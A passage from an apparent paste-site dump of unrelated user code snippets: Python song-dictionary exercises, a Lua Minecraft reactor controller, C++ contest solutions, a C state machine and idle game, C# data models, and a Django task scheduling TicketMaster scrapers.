print('---------------PRINTING SONG, ARTIST, and RELEASED DATE---------------')
print_title_artist_date()

print()
print('---------------SONG RELEASED AFTER 2010---------------')
print_song_released_after_2010()

print()
print('---------------POP SONGS---------------')
print_pop_songs()

print()
print('---------------PRINT GENRE---------------')
print_genre(""Electropop"")

print()
print('---------------PRINT HIGHEST DURATION---------------')
print_highest_duration()

print()
print('---------------PRINT SONGS UNDER LOVER ALBUM---------------')
print_lover_songs()

print()
print('---------------PRINT ALBUM SONGS---------------')
print_album_songs('Lover')

print()
print('---------------PRINT EACH UNIQUE ALBUM SONGS---------------')
print_all_unique_albums_songs()"
MYryGZ02,ic2-oc prg,AlexMastang,Lua,Thursday 23rd of November 2023 01:21:33 PM CDT,"local term = require(""term"")
local component = require(""component"")
local sides = require(""sides"")
local shell = require(""shell"")
local reactor = component.reactor
local battery = component.ic2_te_cesu
local rs = component.redstone

local cfg_n = ""cfg.txt""
local cfg
local data = {}
local reboot = 1
local max_energy = 0.8
local min_energy = 0.2
local rc_side = ""right""
local max_heat = 0.0
local status = false
local capacity = 0.0
local bt_prc = 0.0
local x
local y

local t = 0.0
local t_max = 10.0
local ta = 0.1


-- creates a divider printing
local function divider(c)
    for i=1,term.window.width do
        term.write(c)
    end
    print()
end

-- checks the existence of the given file
local function file_exists(file)
    local f = io.open(file, ""rb"")
    if (f) then f:close() end
    return f ~= nil
end

-- gets all the lines from the given file
local function lines_from(file)
    local lines = {}
    for line in io.lines(file) do
        lines[#lines + 1] = line
    end
    return lines
end

-- edits a specific line of the given file
local function edit_line(inputFile, n, k)
    local fileContent = {}
    fileContent = lines_from(inputFile)

    fileContent[n] = k

    local f = io.open(inputFile, ""w"")
    for i=1,#fileContent do
        f:write(fileContent[i] .. ""\n"")
    end
    f:close()
end

-- gets the real time in seconds
local function rtime()
    local ts = os.date(""%X"")
    return ts
end


term.clear()
term.setCursor(1, 1)
divider(""="")
print((""[%s] Checking for a response from the peripherals..""):format(rtime()))
x, y = term.getCursor()
while (not (reactor and battery)) do
    if (t > t_max) then
        error(""Too long without a response"")
    end
    reactor = component.reactor
    battery = component.ic2_te_cesu
    term.setCursor(1, y)
    print((""T: %.1f""):format(t))
    t = t + 0.1
    os.sleep(0.1)
end
print((""[%s] Done!""):format(rtime()))

-- if the program has arrived at this point then all the components are working properly
-- but there's still a chance of not being truly online, so it waits for a valid response
print((""[%s] Checking if it is online..""):format(rtime()))
x, y = term.getCursor()
t = 0.0
while (reactor.getMaxHeat() == nil and battery.getCapacity() == nil) do
    if (t > t_max) then
        error(""Too long without a response"")
    end
    term.setCursor(1, y)
    print((""T: %.1f""):format(t))
    t = t + 0.1
    os.sleep(0.1)
end
print((""[%s] Done!""):format(rtime()))

print((""[%s] Checking the config file..""):format(rtime()))
-- reads (or creates is it doesn't exist) the config file
if (not file_exists(cfg_n)) then
    -- creates it
    print((""[%s] Config file didn't found""):format(rtime()))
    print((""[%s] Creating it..""):format(rtime()))
    cfg = io.open(cfg_n, ""w"")
    cfg:write(reboot .. ""\n"" .. max_energy .. ""\n"" .. min_energy .. ""\n"" .. ta .. ""\n"" .. rc_side)
    cfg:close()
else
    -- reads it
    print((""[%s] Config file found""):format(rtime()))
    print((""[%s] Reading it..""):format(rtime()))
    data = lines_from(cfg_n)
    reboot = tonumber(data[1])
    max_energy = tonumber(data[2])
    min_energy = tonumber(data[3])
    ta = tonumber(data[4])
    rc_side = data[5]
end
print((""[%s] Done!""):format(rtime()))
-- then it restarts the entire program if necessary
if (reboot ~= 0) then
    edit_line(cfg_n, 1, 0)
    shell.execute(""reboot"")
end

print((""[%s] Setting up the values..""):format(rtime()))

max_heat = reactor.getMaxHeat()
capacity = battery.getCapacity()

print((""[%s] All set!""):format(rtime()))
print((""[%s] Program started""):format(rtime()))


-- MAIN
term.clear()
print(""IC2-OC PRG"")
divider(""="")
x, y = term.getCursor()
while (true) do
    status = reactor.producesEnergy()
    bt_prc = battery.getEnergy() / capacity

    if (bt_prc > max_energy and status) then
        rs.setOutput(sides.rc_side, 0)
    end
    if (bt_prc < min_energy and not status) then
        rs.setOutput(sides.rc_side, 15)
    end

    term.setCursor(1, y)
    print((""Reactor Prod.: %d EU         ""):format(reactor.getReactorEUOutput()))
    print((""Battery Stor.: %.0f / %.0f EU (%.1f%s)         ""):format(battery.getEnergy(), capacity, bt_prc*100, ""%""))
    
    os.sleep(ta)
end"
QdsB9QkL,Untitled,Derga,C++,Thursday 23rd of November 2023 01:21:20 PM CDT,"/*
Нужно написать программу на любом языке программирования, 
которая для каждого числа из массива данных размером 100 элементов о
пределяет количество чисел, которые меньше I - того элемента, 
и делит его на сто.
*/

#include <iostream>
#include <iomanip>
#include <vector>
#include <fstream>

using namespace std;

int GetCountNumbersLessOrEqual(const vector<uint64_t>& numbers, int idx) {
    int count = 0;
    for (int i = 0; i < numbers.size(); ++i) {
        if (idx == i) continue;
        if (numbers[i] <= numbers[idx]) count++;
    }
    return count;
}

int main() {
    vector<uint64_t> numbers(3);
    
    for (auto& number : numbers) {
        cin >> number;
    }

    vector<long double> result(3, 0.);
    for (int i = 0; i < numbers.size(); ++i) {
        result[i] = GetCountNumbersLessOrEqual(numbers, i);
    }

    for (auto& number : result) {
        number /= 100;
    }
    ofstream ofs(""output.txt"");
    for (int i = 0; i < result.size(); ++i) {
        ofs << '(' << i + 1 << "", "" << setprecision(16) << result[i] << ')' << ' ';
    }
}"
RJNg8iHw,The lift,fenixD3,C++,Thursday 23rd of November 2023 01:18:34 PM CDT,"#include <iostream>
#include <vector>
#include <ranges>
#include <algorithm>

template <typename TCont>
void print(const TCont& s, std::string delim = "" "")
{
	std::ranges::copy(s, std::ostream_iterator<typename TCont::value_type>(std::cout, delim.c_str()));
    std::cout << std::endl;
}

template <template <typename> class TCont, typename TType>
TCont<TType> fill_from(int count, std::istream& from)
{
    TCont<TType> seq;
    seq.reserve(count);

    std::ranges::copy(
        std::ranges::istream_view<TType>(from),
        std::inserter(seq, seq.end()));

    return seq;
}

size_t get_min_time_to_get_down(std::vector<size_t>& floors, size_t lift_capacity)
{
    auto get_next_filled_floor_idx = [](const std::vector<size_t>& floors)
    {
        std::vector<size_t> next_filled_floor_idx;
        for (auto i = 0; i < floors.size(); ++i)
        {
            if (floors[i] != 0)
            {
                next_filled_floor_idx.emplace_back(i);
            }
        }

        return next_filled_floor_idx;
    };

    auto next_filled_floor_idx = get_next_filled_floor_idx(floors);

    size_t min_time_to_get_down = 0;
    for (auto i = 0; i < next_filled_floor_idx.size(); ++i)
    {
        auto filled_floor_idx = next_filled_floor_idx[i];
        if (floors[filled_floor_idx] < lift_capacity && i != next_filled_floor_idx.size() - 1)
        {
            floors[next_filled_floor_idx[i + 1]] += floors[filled_floor_idx];
            continue;
        }

        min_time_to_get_down += (floors[filled_floor_idx] / lift_capacity) * (filled_floor_idx + 1) * 2;

        if (size_t remaining_people = floors[filled_floor_idx] % lift_capacity; i == next_filled_floor_idx.size() - 1 && remaining_people != 0)
        {
            min_time_to_get_down += (filled_floor_idx + 1) * 2;
        }
        else if (remaining_people != 0)
        {
            floors[next_filled_floor_idx[i + 1]] += remaining_people;
        }
    }
    return min_time_to_get_down;
}

int main()
{
    size_t lift_capacity, floor_cnt;
    std::cin >> lift_capacity >> floor_cnt;

    std::vector<size_t> floors = fill_from<std::vector, size_t>(floor_cnt, std::cin);

    std::cout << get_min_time_to_get_down(floors, lift_capacity) << std::endl;
}
"
B6sH23Jm,example-state-machine.c,okpalan,C,Thursday 23rd of November 2023 12:52:48 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Define the states as constants
#define Q0 0
#define Q1 1

// Define the alphabet as an array of characters
char alphabet[] = {'0', '1'};

// Define the transition function as a 2D array of integers
int transition[][2] = {{Q0, Q1}, {Q0, Q1}};

// Define the initial state as an integer
int initial = Q0;

// Define the final state as an integer
int final = Q1;

// Define a function that checks if a character is in the alphabet
int is_in_alphabet(char c) {
  for (int i = 0; i < sizeof(alphabet); i++) {
    if (c == alphabet[i]) {
      return 1;
    }
  }
  return 0;
}

// Define a function that runs the state machine on a given input string
int run_state_machine(char* input) {
  // Initialize the current state to the initial state
  int current = initial;
  // Loop through each character of the input string
  for (int i = 0; i < strlen(input); i++) {
    // Check if the character is in the alphabet
    if (is_in_alphabet(input[i])) {
      // Get the index of the character in the alphabet
      int index = input[i] - '0'; // do not understand how this works  in c?
      // Update the current state using the transition function
      current = transition[current][index];
    } else {
      // Reject the input if the character is not in the alphabet
      return 0;
    }
  }
  // Check if the current state is the final state
  if (current == final) {
    // Accept the input if the current state is the final state
    return 1;
  } else {
    // Reject the input if the current state is not the final state
    return 0;
  }
}

// Define a function that tests the state machine on some examples
void test_state_machine() {
  // Define some example input strings
  char* examples[] = {""0"", ""1"", ""01"", ""10"", ""11"", ""101"", ""110"", ""111"", ""1001"", ""1010"", ""1101"", ""1110"", ""1111"", ""0000"", ""0101"", ""0011"", ""0110"", ""0001"", ""0010"", ""0100"", ""1000"", ""2"", ""12"", ""21"", ""a"", ""b"", """"};
  // Loop through each example input string
  for (int i = 0; i < sizeof(examples) / sizeof(char*); i++) {
    // Run the state machine on the example input string
    int result = run_state_machine(examples[i]);
    // Print the result
    printf(""Input: %s, Output: %s\n"", examples[i], result ? ""Accepted"" : ""Rejected"");
  }
}

// Define the main function
int main() {
  // Test the state machine
  test_state_machine();
  // Exit the program
  return 0;
}"
wZWxTUN9,Model retorno pontualidade,ABruel,C#,Thursday 23rd of November 2023 12:51:36 PM CDT,"public class PontualidadeDataModel : IDataModel
{
    public DateTime DataHoraInicio;
    public EmpresaModel Empresa;
    public Guid CoordenacaoServicoId;
    public string Servico;
    public Entities.Linhas.LinhaModel Linha;
    public TimeSpan? TempoAtrasoAdiantado;
    public Entities.Veiculos.VeiculoModel Veiculo;
    public IEnumerable<PessoaModel> Tripulantes;
    public IEnumerable<SecaoModel> Secoes;
    public LocalModel Origem;
    public LocalModel Destino;
}
public class SecaoModel
{
    public string Localidade;
    public string Latitude;
    public string Longitude;
    public DateTime? SaidaProgramada;
    public DateTime? SaidaRealizada;
    public TimeSpan? TempoParada;
}

public abstract class Model<TEntity> where TEntity : Entity, new()
{
    public Guid? Id;
    public byte[] Timestamp;
}

public class LinhaModel : Model<Linha>
{
    public string Codigo;
    public string Descricao;
    public string Prefixo;
    public bool PermiteDobra;
    public Guid? FrotaBasicaId;
    public Guid TipoLinhaId;
    public Guid? ClasseLinhaId;
    public Guid EmpresaId;
}

public class VeiculoModel : Model<Veiculo>
{
    public string Codigo;
    public string Placa;
    public string Fabricacao;
    public string CodigoChassi;
    public Guid? ChassiId;
    public Guid? CarroceriaId;
    public Guid? BaseId;
    public LocalModel Base;
    public Guid FrotaId;
    public FrotaModel Frota;
    public Guid EmpresaId;
    public EmpresaModel Empresa;
    public Guid? ImagemId;
    public ImagemModel Imagem;
    public int? NumDocumentos;
}

public class FrotaModel : Model<Frota>
{
    public string Codigo;
    public string Descricao;
    public int Ordem;
    public int CapacidadePassageiros;
    public int Eixos;
    public float Autonomia;
    public float Custo;
    public string Cor;
}


public class EmpresaModel : Model<Empresa>
{
    public string Nome;
    public string Cnpj;
    public string Codigo;
    public string Endereco;
    public string EnderecoComplemento;
    public string EnderecoNumero;
    public string Bairro;
    public string Cep;
    public string Telefone;
    public string InscricaoEstadual;
    public string EMail;
    public Guid? CidadeId;
    public Guid? SindicatoId;
    public Guid? ImagemId;
    public Guid? EmpresaPaiId;
    public TipoEmpresa Tipo;
}

public enum TipoEmpresa
{
    MATRIZ = 1,
    FILIAL,
    TERCEIRIZADA
}


public class LocalModel : Model<Local>
{
    public string Codigo;
    public string Nome;
    public string Latitude;
    public string Longitude;
    public bool BaseOperacional;
    public string CriterioGestao;
    public Guid TipoLocalId;
    public Guid CidadeId;
    public Guid? BaseOperacionalVinculadaId;
}
"
HRqCdajs,Untitled,GravityBR,C,Thursday 23rd of November 2023 12:50:17 PM CDT,"#include ""lib.c""

int main(void){
	
	number nbx[MAX_NUMBERS];
	number delta, sum, prod, idle, test[] = {idle, delta, ZERO, ZERO, ZERO};
	FILE *fp;
	int lapse, aux = 0;
	char ctrl, lixo[100];
	
	for(int i=0; i<MAX_NUMBERS; i++){
		initNumberZERO(&nbx[i]);
	}
	initNumberZERO(&delta);
	initNumberONE(&idle);
	initNumberZERO(&sum);
	
	createSave(fp);
	loadSave(fp);
	
	overwrite(&idle, &saved_idle);
	overwrite(&sum, &saved_sum);
	
	do{
		if(!aux){
			delta.a = difftime(date_now, date_last);
			date_last = date_now;
			lapse = (int) delta.a;
			checkNumber(&delta);
			
			overwrite(&test[1], &delta);
			
			welcomeBack(lapse, test, &prod);
			
			overwrite(&nbx[MAX_NUMBERS-1], &prod);
			sumNumber(nbx, &sum);
			
			printf(""\n\n"");
			outputFormat(&sum);
			printf(""\n"");
		}
		
		fgets(lixo, 99, stdin);
		ctrl = lixo[0];
		time(&date_now);
		
		initNumberZERO(&delta);
		delta.a = difftime(date_now, date_last);
		date_last = date_now;
		lapse = (int) delta.a;
		checkNumber(&delta);
		
		overwrite(&test[1], &delta);
			
		prodNumber(test, &prod);
		
		overwrite(&nbx[MAX_NUMBERS-1], &prod);
		sumNumber(nbx, &sum);
		
		printf(""\n\n"");
		outputFormat(&sum);
		printf(""\n"");
		
		if(ctrl == '1'){
			idle.a *= 2;
			checkNumber(&idle);
			overwrite(&test[0], &idle);
		}
		
		aux++;
	} while(ctrl != '0');
	
	saveSave(fp);
	
	return 0;
}
"
TEVCeh5Y,Untitled,GravityBR,C,Thursday 23rd of November 2023 12:49:34 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <math.h>
#include <time.h>

typedef enum{
	MAX_CHARS = 3,
	MAX_EXP = (26*26*26*(MAX_CHARS)),
	BASE = 10,
	IGNORE = 8, /* see comentary below */
	MAX_NUMBERS = 5
} magic_numbers;

/* 1 year = 60*60*24*365 = 31,536,000 = 3.15e7

 * so there is no point to try to add numbers
   like 1e20/s and 1e12/s

 * (it will take 3 years to have a 1e20 loss, but
   you should have 1e28 itens by now)
 */
 

/* 0 <= x < BASE^MAX_EXP */
typedef struct{
	double a;	/* a*BASE^exp */
	int exp;
} number;


void *aux_t;
time_t date_start = EOF, date_last = EOF, date_now = EOF;
const number ZERO = {0.0, 0}, ONE = {1.0, 0};
number saved_idle, saved_sum;

int maxXY(const int x, const int y){
	
	return (x + y + abs(x-y)) / 2;
}

int minXY(const int x, const int y){
	
	return (x + y - abs(x-y)) / 2;
}

void initNumberZERO(number *nb){
	
	nb->a = ZERO.a;
	nb->exp = ZERO.exp;
}

void initNumberONE(number *nb){
	
	nb->a = ONE.a;
	nb->exp = ONE.exp;
}

void overwrite(number *dst, const number *src){
	
	dst->a = src->a;
	dst->exp = src->exp;
}

bool isEqual(const number *nb1, const number *nb2){
	
	if((nb1->a == nb2->a) && (nb1->exp == nb2->exp)) return true;
	else return false;
}

/* EOF = invalid *number
 * 0 = invalid and changed to number ZERO
 * >0 = valid (return - 1 equals number of changes)
 */
int checkNumber(number *nb){
	
	if(nb == NULL) return EOF;
    
    int aux = 1;
    
    if(nb->a < 0 || nb->exp < 0 || nb->exp > MAX_EXP){
    	overwrite(nb, &ZERO);
    	return 0;
    }
    
    while(nb->a < 1){
    	nb->a *= BASE;
    	nb->exp--;
    	aux++;
    	
    	if(nb->exp < 0){
    		overwrite(nb, &ZERO);
    		return 0;
    	}
    }
    
    while(nb->a >= BASE){
    	nb->a /= BASE;
    	nb->exp++;
    	aux++;
        
        if(nb->exp > MAX_EXP){
        	overwrite(nb, &ZERO);
        	return 0;
        }
	}
	return aux;
}

/* EOF = number is too low and will be ignored
 * 0 = number not changed
 * >0 = number changed
 */
int convNumber(number *nb, const int new_exp){
    
    if(abs(nb->exp - new_exp) > IGNORE){
        return EOF;
    }
    
    int aux = 0;
    
    if(nb->exp > new_exp){
        nb->a *= pow(BASE, (nb->exp - new_exp));
        nb->exp = new_exp;
        aux++;
    } else{
        nb->a /= pow(BASE, (new_exp - nb->exp));
        nb->exp = new_exp;
        aux++;
    }
    
    return aux;
}

void sumNumber(number *src, number *dst){
    
    initNumberZERO(dst);
    
    int aux = 0;
    bool s[MAX_NUMBERS];
        
    for(int i=0; i<MAX_NUMBERS; i++) s[i] = true;
    
    for(int i=0; i<MAX_NUMBERS; i++){
        if(isEqual(&src[i], &ZERO)){
        	s[i] = false;
        } else if(checkNumber(&src[i]) == EOF){
            s[i] = false;
        } else{
        	aux = maxXY(aux, src[i].exp);
        }
    }
    
    aux = maxXY(aux, dst->exp);
    dst->exp = aux;
    
    for(int i=0; i<MAX_NUMBERS; i++){
        if(!isEqual(&src[i], &ZERO) && s[i] != false){
            if(convNumber(&src[i], aux) == EOF){
                s[i] = false;
            }
        }
    }
    
    for(int i=0; i<MAX_NUMBERS; i++){
        if(!isEqual(&src[i], &ZERO) && s[i] != false){
            dst->a += src[i].a;
        }
    }
    
	checkNumber(dst);
}

void prodNumber(number *src, number *dst){
	
    initNumberONE(dst);
    
    for(int i=0; i<MAX_NUMBERS; i++){
        if(checkNumber(&src[i]) == EOF){
        	continue;
        } else if(isEqual(&src[i], &ZERO)){
        	continue;
        } else{
            dst->a *= src[i].a;
            dst->exp += src[i].exp;
        }
    }
    
	checkNumber(dst);
}


void createSave(FILE *fp){
	
	if((fp = fopen(""save.SAVE"", ""ab+"")) == NULL){
		exit(1);
	}
	
	rewind(fp);
	
	if(fread(&aux_t, sizeof(time_t), 1, fp) == 1){
		fclose(fp);
		return;
	}
	
	date_last = time(&date_start);
	
	if(fwrite(&date_start, sizeof(time_t), 1, fp) != 1){
		exit(2);
	}
	
	if(fwrite(&date_last, sizeof(time_t), 1, fp) != 1){
		exit(2);
	}
	
	if(fwrite(&ONE, sizeof(number), 1, fp) != 1){
		exit(2);
	}
	
	if(fwrite(&ZERO, sizeof(number), 1, fp) != 1){
		exit(2);
	}
			
	fclose(fp);
	return;
}

void loadSave(FILE *fp){
	
	if((fp = fopen(""save.SAVE"", ""rb"")) == NULL){
		exit(1);
	}
	
	time(&date_now);
	
	if(fread(&date_start, sizeof(time_t), 1, fp) != 1){
		exit(2);
	}
	
	if(fread(&date_last, sizeof(time_t), 1, fp) != 1){
		exit(2);
	}
	
	if(fread(&saved_idle, sizeof(number), 1, fp) != 1){
		exit(2);
	}
	
	if(fread(&saved_sum, sizeof(number), 1, fp) != 1){
		exit(2);
	}
	
	fclose(fp);
}

void saveSave(FILE *fp){
	
	if((fp = fopen(""save.SAVE"", ""rb"")) == NULL){
		exit(1);
	}
	fclose(fp);
	
	if((fp = fopen(""save.SAVE"", ""wb+"")) == NULL){
		exit(1);
	}
	
	time(&date_last);
	if(fwrite(&date_start, sizeof(time_t), 1, fp) != 1){
		exit(2);
	}
	
	if(fwrite(&date_last, sizeof(time_t), 1, fp) != 1){
		exit(2);
	}
	
	if(fwrite(&saved_idle, sizeof(number), 1, fp) != 1){
		exit(2);
	}
	
	if(fwrite(&saved_sum, sizeof(number), 1, fp) != 1){
		exit(2);
	}
			
	fclose(fp);
}

char convChar(const int i){
	
	switch(i){
		case 0:
			return 'A';
		case 1:
			return 'B';
		case 2:
			return 'C';
		case 3:
			return 'D';
		case 4:
			return 'E';
		case 5:
			return 'F';
		case 6:
			return 'G';
		case 7:
			return 'H';
		case 8:
			return 'I';
		case 9:
			return 'J';
		case 10:
			return 'K';
		case 11:
			return 'L';
		case 12:
			return 'M';
		case 13:
			return 'N';
		case 14:
			return 'O';
		case 15:
			return 'P';
		case 16:
			return 'Q';
		case 17:
			return 'R';
		case 18:
			return 'S';
		case 19:
			return 'T';
		case 20:
			return 'U';
		case 21:
			return 'V';
		case 22:
			return 'W';
		case 23:
			return 'X';
		case 24:
			return 'Y';
		case 25:
			return 'Z';
		default:
			return '\0';
	}
}

void outputFormat(number *nb){
	
	double a = nb->a;
	int exp = nb->exp, x, y, aux, temp;
	char symbols[MAX_CHARS + 1];
	
	x = exp / 3;
	y = exp % 3;
	
	for(int i=0; i<MAX_CHARS; i++){
		temp = MAX_CHARS - 1 - i;
		aux = x / ( (int) pow(26, temp));
		symbols[i] = convChar(aux);
		if(temp) x %= ( (int) pow(26, temp));
	}
	
	symbols[MAX_CHARS] = '\0';
	
	convNumber(nb, (exp - y));
	
	printf(""%lf %s"", nb->a, symbols);
}

void welcomeBack(int tm, number *src, number *dst){
	
	int d, h, m, s;
	
	d = tm / 86400;
	tm %= 86400;
	h = tm / 3600;
	tm %= 3600;
	m = tm / 60;
	tm %= 60;
	s = tm;
	
	prodNumber(src, dst);
	
	if(d){
		printf(""You were away for %d day(s), %d hour(s), %d minute(s), %d second(s)"", d, h, m, s);
	} else if(h){
		printf(""You were away for %d hour(s), %d minute(s), %d second(s)"", h, m, s);
	} else if(m){
		printf(""You were away for %d minute(s), %d second(s)"", m, s);
	} else if(s){
		printf(""You were away for %d second(s)"", s);
	}
	
	if(d || h || m || s){
		printf("" and got "");
		outputFormat(dst);
		printf("" itens\n"");
	}
}
"
bT88yswU,Frank Lee The Great,IMustRemainUnknown,Python,Thursday 23rd of November 2023 12:43:38 PM CDT,"song_dictionary = {
    'song1': {'title': 'Bad Day',
              'artist': 'Daniel Powter',
              'album': ['Daniel Powter'],
              'release_date': 2005,
              'genre': ['Pop']}
}


def add_song(song_title, song_artist, album, release_date, genre):
    dict_count = len(song_dictionary) + 1
    song_dictionary['song' + str(dict_count)] = {'title': song_title,
                                                 'artist': song_artist,
                                                 'album': [album],
                                                 'release_date': release_date,
                                                 'genre': [genre]}


def print_all_unique_genre():
    # Extracting unique genres
    unique_genres = set()
    for movie_info in song_dictionary.values():
        unique_genres.update(movie_info.get('genre', []))

    # Printing unique genres
    print('Unique Genres:', unique_genres)

def print_all_unique_albums():
    # Extracting unique genres
    unique_albums = set()
    for movie_info in song_dictionary.values():
        unique_albums.update(movie_info.get('album', []))

    # Printing unique genres
    print('Unique Albums:', unique_albums)


def print_album_songs():
    # Extracting unique genres
    unique_genres = set()
    for movie_info in song_dictionary.values():
        unique_genres.update(movie_info.get('genres', []))

    # Printing unique genres
    print('Unique Genres:', unique_genres)


def print_title_artist_date():
    for song_id, song_info in song_dictionary.items():
        title = song_info['title']
        artist = song_info['artist']
        release_date = song_info['release_date']
        print(f""{title}\t{artist}\t{release_date}"")


def print_song_released_after_2010():
    # Print song titles released after the year 2010
    for song_id, song_info in song_dictionary.items():
        title = song_info['title']
        release_date = song_info['release_date']

        # Check if the release year is known and greater than 2010
        if release_date > 2010:
            print(f""{title} (Released in {release_date})"")


print(song_dictionary)
print('--------------------------------------------------------------------------------------')
add_song('Adore You', 'Harry Styles', 'Fine Line', 2019, 'Funk, Disco, Pop Rock')
add_song('A Thousand Miles', 'Vanessa Cariton', 'Be Not Nobody', 2002, 'Pop')
add_song('Lover', 'Taylor Swift', 'Lover', 2019, 'Country, Indie Folk, Alternative Country')
print(song_dictionary)
print_all_unique_genre()
print_all_unique_albums()
print_title_artist_date()
print_song_released_after_2010()

"
Yru7BFyL,Untitled,Josif_tepe,C++,Thursday 23rd of November 2023 12:25:26 PM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <cstring>
#include <queue>
//#include <bits/stdc++.h>

using namespace std;
const int INF = 2e9;
const int maxn = 3e5 + 10;
typedef long long ll;
int n;
ll k;
vector<int> graph[maxn];
int a[maxn];
void brute_force() {
    int S = 0;

    for(int i = 0; i < k; i++) {
        vector<bool> visited(n + 1, false);
        visited[S] = true;
        queue<int> q;
        q.push(S);
        q.push(0);
        int max_dist = -INF;
        int next_node = -1;
        while(!q.empty()) {
            int node = q.front();
            q.pop();
            int dist = q.front();
            q.pop();
            if(a[node] - dist > max_dist and S != node) {
                max_dist = a[node] - dist;
                next_node = node;
            }
            if(a[node] - dist == max_dist and S != node) {
                next_node = min(next_node, node);
            }
            for(int neighbour : graph[node]) {
                if(!visited[neighbour]) {
                    visited[neighbour] = true;
                    q.push(neighbour);
                    q.push(dist + 1);
                }
            }
        }
        S = next_node;
        
    }
    cout << S + 1 << endl;
}
void solve_subtask2() {
    int S = 0;
    vector<int> cnt(n + 1, 0);
    vector<int> cycle;
    bool cycle_begin = false;
    int till_cycle = 0;
    for(int i = 0; i < 10000; i++) {
        
        vector<bool> visited(n + 1, false);
        visited[S] = true;
        int next_node = -1, max_dist = -INF;
        
        queue<int> q;
        q.push(S);
        q.push(0);
        cnt[S]++;
        if(cnt[S] == 2) {
            cycle_begin = true;
//            cout << S + 1 << endl;
        }
        
        if(cycle_begin) {
            cycle.push_back(S);
        }
        else {
            till_cycle++;
        }
        while(!q.empty()) {
            int node = q.front();
            q.pop();
            int dist = q.front();
            q.pop();
            
            if(a[node] - dist > max_dist and S != node) {
                max_dist = a[node] - dist;
                next_node = node;
            }
            if(a[node] - dist == max_dist and S != node) {
                next_node = min(next_node, node);
            }
            for(int neighbour : graph[node]) {
                if(!visited[neighbour]) {
                    visited[neighbour] = true;
                    q.push(neighbour);
                    q.push(dist + 1);
                }
            }
        }
        S = next_node;
        if(cycle_begin and S == cycle[0]) {
//            for(int x : cycle) {
//                cout << x + 1 << "" "" ;
//            }
            break;
        }
    }
//    cout << endl;
//    cout << ""till: "" << till_cycle - cycle.size() - 1<< endl;
//    cout << cycle.size() << endl;
    till_cycle =  till_cycle - cycle.size() - 1;
    k -= till_cycle;
//    cout << k << endl;
    
    cout << cycle[(k + 1) % (ll) cycle.size()] + 1 << endl;
}
int main()
{
    ios::sync_with_stdio(false);
    cin >> n >> k;
    for(int i = 0; i < n; i++) {
        cin >> a[i];
    }
    
    for(int i = 1; i < n; i++) {
        int a, b;
        cin >> a >> b;
        a--; b--;
        graph[a].push_back(b);
        graph[b].push_back(a);
    }
    
    if(n <= 1000 and k <= 1000) {
        brute_force();
        return 0;
    }
    
    if(n <= 1000) {
        solve_subtask2();
        return 0;
    }
    return 0;
}
"
MgvduwPK,rabbitmq test scraper,DooD13Z,Python,Thursday 23rd of November 2023 12:21:34 PM CDT,"from time import sleep
from ticketsmgmt.core.utils import split_list_to_chunks_by_n
from ticketsmgmt.event.models import Event
import json
import logging
from constance import config
from datetime import datetime
from django.conf import settings
from django.db.models import Q
from django.utils import timezone
from ticketsmgmt.event.tasks import schedule_spider
logger = logging.getLogger(""ticketsmgmt.event.tasks"")


start = datetime.now()

every = ""30""
period = ""seconds""
now = timezone.now()
events = Event.objects.filter(
    periodic_interval__every=every,
    periodic_interval__period=period,
    is_archived=False,
    event_scraper_name='TicketMaster'
)
events = events.filter(
    Q(event_date_time__isnull=True) | Q(event_date_time__gte=now)
)
events = events.filter(Q(paused_until__isnull=True) | Q(paused_until__lte=now))


def run_scrapy(
    events, force_event_details_update=False, via_rabbitmq=False, is_tasks4=False, n=100
):
    """"""
    Currently TM is the only spider that supports multi url scrape. After other
    scrapers will have this feature it will be the same method for all scrapers.
    """"""
    scheduling_data = []
    scheduling_data_tm = []
    scheduled_events_ids = []
    for event in events:
        if not event.is_scrape_allowed():
            continue

        if event.event_scraper_name in [""TicketMaster"", ""TicketMasterRabbitMQ""]:
            scheduling_data_tm.append(
                {
                    ""url"": event.event_url,
                    ""tixt_event_id"": event.id,
                    ""discovery_id"": event.tm_discovery_id,
                    ""force_event_details_update"": force_event_details_update,
                }
            )
            logger.debug(
                ""TM event %s was queued for scraping, discovery ID - %s"",
                event.event_url,
                event.tm_discovery_id,
            )
        else:
            scheduling_data.append(
                {
                    ""spider_name"": event.event_scraper_name,
                    ""url"": event.event_url,
                    ""tixt_event_id"": event.id,
                }
            )
            logger.debug(""Event %s was queued for scraping."", event.event_url)
        scheduled_events_ids.append(event.id)

    scrapy_id = 0
    max_scrapy_id = len(settings.SCRAPYD_SERVERS.copy())
    for data in scheduling_data:
        scrapyd_server = settings.SCRAPYD_SERVERS.copy()[scrapy_id]
        if is_tasks4:
            scrapyd_server = ""http://192.168.50.38:6800""
        try:
            schedule_spider(
                scrapyd_server,
                settings.SCRAPYD_PROJECT,
                data[""spider_name""],
                url=data[""url""],
                tixt_event_id=data[""tixt_event_id""],
            )
            logger.debug(
                ""Scheduled spider for event %s, server - %s."",
                data[""url""],
                scrapyd_server,
            )
            scrapy_id += 1
            if scrapy_id >= max_scrapy_id:
                scrapy_id = 0
        except Exception as e:
            logger.error(""Could not schedule spider"", exc_info=True)

    # TM schedule multi event
    schedule_chunks = split_list_to_chunks_by_n(scheduling_data_tm, chunk_size=n)

    scrapy_id = 0
    spider = ""TicketMaster""
    if via_rabbitmq:
        spider = ""TicketMasterRabbitMQ""

    for chunk in schedule_chunks:
        if chunk:
            scrapyd_server = settings.SCRAPYD_SERVERS.copy()[scrapy_id]
            if is_tasks4:
                scrapyd_server = ""http://192.168.50.38:6800""
            try:
                schedule_spider(
                    scrapyd_server,
                    settings.SCRAPYD_PROJECT,
                    spider,
                    events=json.dumps(chunk),
                    filter_out_offers_by_name=config.TM_FILTER_OUT_OFFERS_BY_NAME,
                )
                logger.debug(
                    ""Scheduled bulk of %s TM events, server - %s."",
                    len(chunk),
                    scrapyd_server,
                )
            except Exception as e:
                logger.error(
                    f""Could not schedule TM spider chunk on the server {scrapyd_server}"",
                    exc_info=True,
                )
            scrapy_id += 1
            if scrapy_id >= max_scrapy_id:
                scrapy_id = 0
    print(len(scheduled_events_ids))


run_scrapy(events, n=10)"
z3DyPJuw,Untitled,Sreekar_0125,C++,Thursday 23rd of November 2023 12:15:50 PM CDT,"#include <bits/stdc++.h>
#include <ext/pb_ds/assoc_container.hpp> 
#include <ext/pb_ds/tree_policy.hpp>     
using namespace std;
using namespace __gnu_pbds;
template <class T>
using pbds =
    tree<T, null_type, less<T>, rb_tree_tag, tree_order_statistics_node_update>;
